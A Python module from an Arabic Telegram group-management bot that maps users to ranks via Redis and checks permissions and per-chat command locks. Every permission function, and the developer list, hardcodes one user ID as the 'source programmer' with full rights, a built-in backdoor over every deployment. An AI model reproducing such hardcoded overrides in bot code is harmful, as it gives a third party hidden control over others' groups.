from config import *
import re
def get_rank(id, cid) -> str:
   if id == 7285544053 or id == 7285544053:
      return 'مبرمج السورس🥇'
   if id == int(Dev_FLER):
      return 'البوت'
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return 'المبرمج🎖️'
   if r.get(f'{id}:rankDEV2:{Dev_FLER}'):
      return 'مطور اساسي🎖'
   if r.get(f'{id}:rankDEV:{Dev_FLER}'):
      return 'مطور ثانوي🎖️'
   if r.get(f'{id}:gban:{Dev_FLER}'):
      return 'محظور عام'
   if r.get(f'{id}:mute:{Dev_FLER}'):
      return 'محظور عام'
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_FLER}'):
      if r.get(f'{cid}:RankGowner:{Dev_FLER}'):
         return r.get(f'{cid}:RankGowner:{Dev_FLER}')
      return 'المالك الاساسي'
   if r.get(f'{cid}:rankOWNER:{id}{Dev_FLER}'):
      if r.get(f'{cid}:RankOwner:{Dev_FLER}'):
         return r.get(f'{cid}:RankOwner:{Dev_FLER}')
      return 'المالك'
   if r.get(f'{cid}:rankMOD:{id}{Dev_FLER}'):
      if r.get(f'{cid}:RankMod:{Dev_FLER}'):
         return r.get(f'{cid}:RankMod:{Dev_FLER}')
      return 'المدير'
   if r.get(f'{cid}:rankADMIN:{id}{Dev_FLER}'):
      if r.get(f'{cid}:RankAdm:{Dev_FLER}'):
         return r.get(f'{cid}:RankAdm:{Dev_FLER}')
      return 'ادمن'
   if r.get(f'{cid}:rankPRE:{id}{Dev_FLER}'):
      if r.get(f'{cid}:RankPre:{Dev_FLER}'):
         return r.get(f'{cid}:RankPre:{Dev_FLER}')
      return 'مميز'
   else:
      if r.get(f'{cid}:RankMem:{Dev_FLER}'):
         return r.get(f'{cid}:RankMem:{Dev_FLER}')
      return 'عضو'

def admin_pls(id, cid) -> bool:
   if id == 7285544053 or id == 7285544053:
      return True
   if id == 7285544053 or id == 7285544053:
      return True
   if id == int(Dev_FLER):
      return True
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_FLER}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{Dev_FLER}'):
      return True
   else:
      return False

def mod_pls(id, cid) -> bool:
   if id == 7285544053 or id == 7285544053:
      return True
   if id == 7285544053 or id == 7285544053:
      return True
   if id == int(Dev_FLER):
      return True
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_FLER}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_FLER}'):
      return True
   else:
      return False

def owner_pls(id, cid) -> bool:
   if id == 7285544053 or id == 7285544053:
      return True
   if id == 7285544053 or id == 7285544053:
      return True
   if id == int(Dev_FLER):
      return True
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_FLER}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_FLER}'):
      return True
   else:
      return False

def gowner_pls(id, cid) -> bool:
   if id == 7285544053 or id == 7285544053:
      return True
   if id == 7285544053 or id == 7285544053:
      return True
   if id == int(Dev_FLER):
      return True
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_FLER}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_FLER}'):
      return True
   else:
      return False

def dev_pls(id, cid) -> bool:
   if id == 7285544053 or id == 7285544053:
      return True
   if id == 7285544053 or id == 7285544053:
      return True
   if id == int(Dev_FLER):
      return True
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_FLER}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_FLER}'):
      return True
   else:
      return False

def dev2_pls(id, cid) -> bool:
   if id == 7285544053 or id == 7285544053:
      return True
   if id == 7285544053 or id == 7285544053:
      return True
   if id == int(Dev_FLER):
      return True
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_FLER}'):
      return True
   else:
      return False



def devp_pls(id, cid) -> bool:
   if id == 7285544053 or id == 7285544053:
      return True
   if id == 7285544053 or id == 7285544053:
      return True
   if id == int(Dev_FLER):
      return True
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return True
   else:
      return False


def pre_pls(id, cid) -> bool:
   if id == 7285544053 or id == 7285544053:
      return True
   if id == 7285544053 or id == 7285544053:
      return True
   if id == int(r.get(f'{Dev_FLER}botowner') or 0):
      return True
   if id == int(Dev_FLER):
      return True
   if r.get(f'{id}:rankDEV2:{Dev_FLER}'):
      return True
   if r.get(f'{id}:rankDEV:{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankGOWNER:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankOWNER:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankMOD:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankADMIN:{id}{Dev_FLER}'):
      return True
   if r.get(f'{cid}:rankPRE:{id}{Dev_FLER}'):
      return True
   else:
      return False


def get_devs_br():
   list = []
   if not int(r.get(f'{Dev_FLER}botowner') or 0) == 7285544053:
      list.append(7285544053)
   list.append(int(r.get(f'{Dev_FLER}botowner') or 0))
   if r.smembers(f'{Dev_FLER}DEV2'):
      for dev2 in r.smembers(f'{Dev_FLER}DEV2'):
         list.append(int(dev2))
   return list


def isLockCommand(fid: int, cid: int, text: str):
   if not r.hgetall(Dev_FLER+f"locks-{cid}"):
      return False
   else:
      commands = r.hgetall(Dev_FLER+f"locks-{cid}")
      if text not in commands: return False
      for command in commands:
         cc = int(commands[command])
         if command.lower() in text.lower():
            print(text)
            print(command)
            if cc == 0:
               if not gowner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 1:
               if not owner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 2:
               if not mod_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 3:
               if not admin_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 4:
               if not pre_pls(fid, cid):
                  return True
               else:
                  return False